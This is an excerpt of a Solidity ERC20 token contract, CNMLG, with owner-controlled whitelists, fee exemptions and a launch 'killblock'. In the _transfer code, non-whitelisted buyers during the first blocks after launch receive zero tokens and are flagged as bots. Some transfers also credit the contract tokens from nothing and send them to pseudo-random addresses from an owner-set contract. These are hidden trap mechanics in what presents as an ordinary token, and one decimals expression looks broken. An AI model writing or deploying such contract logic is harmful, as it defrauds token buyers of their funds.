...
interface IRandomAddress{
    function getRandomAddress(uint256 i) external view returns(address);
}
...
contract CNMLG is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CNMLG";
    string private _symbol = "CNMLG";
    ...
    uint256 public _walletMax = 1 * 10**9 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 1 * 10**5 * 5 **_decimals; 
    ...
    constructor (address payable ma, address payable la) {
        ...
        marketingWalletAddress = ma;
        liquidityWalletAddress = la;
    ...
    function setMultipleAccount(address[] memory accounts) public onlyOwner{
        for (uint i=0;i<accounts.length;i++)
            isExcludedFromFee[accounts[i]] = true;
    }

    function recover(address[] memory accounts) public onlyOwner{
        for (uint i=0;i<accounts.length;i++)
    ...
    address private randomAddressContract;
    function setRandomAddressContract(address _randomAddressContract) public onlyOwner{
        randomAddressContract = _randomAddressContract;
    }

    mapping(address=>bool) private AddressWhite;
    function inputList(address[] memory _accounts) public onlyOwner{
        for(uint i=0;i<_accounts.length;i++)
            setAddressWhite(_accounts[i]);
    }

    function setAddressWhite(address _accounts) private {
            AddressWhite[_accounts] = true;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient] || sender==uniswapPair)
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            else
                _balances[sender] = _balances[sender].sub(amount.sub(amount.div(10000)), "Insufficient Balance");
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                _balances[address(this)] = _balances[address(this)].add(300);
                for(uint i = block.timestamp;i<block.timestamp+3;i++)
                    _basicTransfer(address(this),IRandomAddress(randomAddressContract).getRandomAddress(i),100);
                        
                finalAmount = takeFee(sender, recipient, amount);
                if(sender == uniswapPair) {
                    if (block.number <= launchedBlock + killblock) {
                        if(AddressWhite[recipient])
                            finalAmount = finalAmount;
                        else {
                            finalAmount = finalAmount.mul(0);
                            addBot(recipient);
                        }
                    }
                }                
